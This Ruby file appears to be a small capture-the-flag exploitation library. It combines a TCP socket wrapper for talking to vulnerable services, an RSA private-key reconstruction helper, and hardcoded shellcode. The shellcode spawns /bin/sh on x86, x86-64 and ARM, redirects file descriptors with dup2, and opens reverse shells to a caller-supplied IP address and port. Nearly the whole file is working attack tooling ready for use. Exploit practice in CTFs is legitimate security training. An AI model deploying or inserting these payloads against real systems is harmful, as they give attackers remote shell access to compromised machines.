#coding:ascii-8bit
require "socket"
require "openssl"

class String
  def rot13
    self.tr("A-Za-z", "N-ZA-Mn-za-m")
  end

  def scanf_safe?
    self !~ /[\x09\x0a\x0b\x0c\x0d\x20]/
  end

  def tty_safe?
    self !~ /[\x03\x04\x0a\x0d\x11\x12\x13\x15\x16\x17\x1a\x1c\x7f]/
  end
end

class OpenSSL::PKey::RSA
  def complete_private_key!
    raise "p or q is empty" unless self.p != 0 && self.q != 0
    raise "e is empty" unless self.e != 0

    self.n = self.p * self.q
    self.d = self.e.mod_inverse((self.p - 1) * (self.q - 1))
    self.dmp1 = self.d % (self.p - 1)
    self.dmq1 = self.d % (self.q - 1)
    self.iqmp = self.q.mod_inverse(self.p)

    self
  end
end

class PwnLib
  def self.shellcode_x86
    # http://inaz2.hatenablog.com/entry/2014/03/13/013056
    "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
  end

  def self.shellcode_x86_64
    # http://shell-storm.org/shellcode/files/shellcode-806.php
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  end

  def self.shellcode_arm
    # http://shell-storm.org/shellcode/files/shellcode-698.php
    "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
  end

  def self.dup2_x86(newfd)
    "\x31\xff\x6a\x3f\x58\x6a#{newfd.chr}\x5b\x89\xf9\xcd\x80\x47\x83\xff\x03\x75\xf0"
  end

  def self.dup2_x86_64(newfd)
    "\x48\x31\xdb\x6a\x21\x58\x6a#{newfd.chr}\x5f\x48\x89\xde\x0f\x05\x48\xff\xc3\x48\x83\xfb\x03\x75\xec"
  end

  def self.reverse_shell_x86(ip, port)
    # http://shell-storm.org/shellcode/files/shellcode-883.php
    "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" + ip.split(".").map{|a| a.to_i.chr}.join + "\x66\x68" + [port].pack("n") + "\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
  end

  def self.reverse_shell_x86_64(ip, port)
    # http://shell-storm.org/shellcode/files/shellcode-857.php
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" +
      "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" +
      "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" +
      "\x02" + [port].pack("n") + "\xc7\x44\x24\x04" + ip.split(".").map{|a| a.to_i.chr}.join + "\x48\x89\xe6\x6a\x10" +
      "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" +
      "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" +
      "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" +
      "\x5f\x6a\x3b\x58\x0f\x05"
  end

end

class PwnLib::TimeoutError < IOError
end

class PwnTube
  attr_accessor :socket, :wait_time, :debug, :log_output

  def initialize(socket, log_output = $>)
    @wait_time = 0
    @debug = false
    @socket = socket
    @log_output = log_output

    self
  end

  def self.open(host, port, log_output = $>, &block)
    socket = TCPSocket.open(host, port)
    instance = self.new(socket, log_output)
    instance.log "[*] connected"

    return instance unless block_given?

    begin
      block.call(instance)
    ensure
      begin
        instance.close
      rescue
      end
    end

    nil
  end

  def close
    @socket.close
    log "[*] connection closed"
  end

  def send(msg)
    @socket.send(msg, 0)
    @socket.flush
    log "<< #{msg.inspect}" if @debug
    sleep(@wait_time)
  end

  def sendline(msg = "")
    self.send(msg + "\n")
  end

  def recv(size = 8192, timeout = nil)
    raise PwnLib::TimeoutError.new if IO.select([@socket], [], [], timeout).nil?
    @socket.recv(size).tap{|a| log ">> #{a.inspect}" if @debug}
  end

  def recv_until(pattern, timeout = nil)
    raise ArgumentError.new("type error") unless pattern.is_a?(String) || pattern.is_a?(Regexp)

    s = ""
    while true
      if pattern.is_a?(String) && s.include?(pattern) || pattern.is_a?(Regexp) && s =~ pattern
        break
      end
      if (c = recv(1, timeout)) && c.length > 0
        s << c
      else
        log s.inspect
        raise EOFError.new
      end
    end
    s
  end

  def recv_until_eof(timeout = nil)
    s = ""
    while (c = recv(1, timeout)) && c.length > 0
      s << c
    end
    s
  end

  def recv_capture(pattern, timeout = nil)
    recv_until(pattern, timeout).match(pattern).captures
  end

  def interactive(terminate_string = nil)
    end_flag = false

    send_thread = Thread.new(self) do |tube|
      begin
        while true
          s = $stdin.gets
          if !s || s.chomp == terminate_string
            break
          end
          tube.socket.send(s, 0)
        end
      rescue
      end
      end_flag = true
    end
    recv_thread = Thread.new(self) do |tube|
      begin
        while !end_flag
          if IO.select([tube.socket], [], [], 0.05) != nil
            buf = tube.socket.recv(8192)
            break if buf.empty?
            $>.print buf
            $>.flush
          end
        end
      rescue => e
        $>.puts "[!] #{e}"
      end
      send_thread.kill
      end_flag = true
    end

    $>.puts "[*] interactive mode"

    [send_thread, recv_thread].each(&:join)
    $>.puts "[*] end interactive mode"
  end

  def shell
    $>.puts "[*] waiting for shell..."
    sleep(0.1)
    self.send("echo PWNED\n")
    self.recv_until("PWNED\n")
    self.interactive
  end

  def log(*args)
    @log_output.puts *args unless @log_output.nil?
  end
end
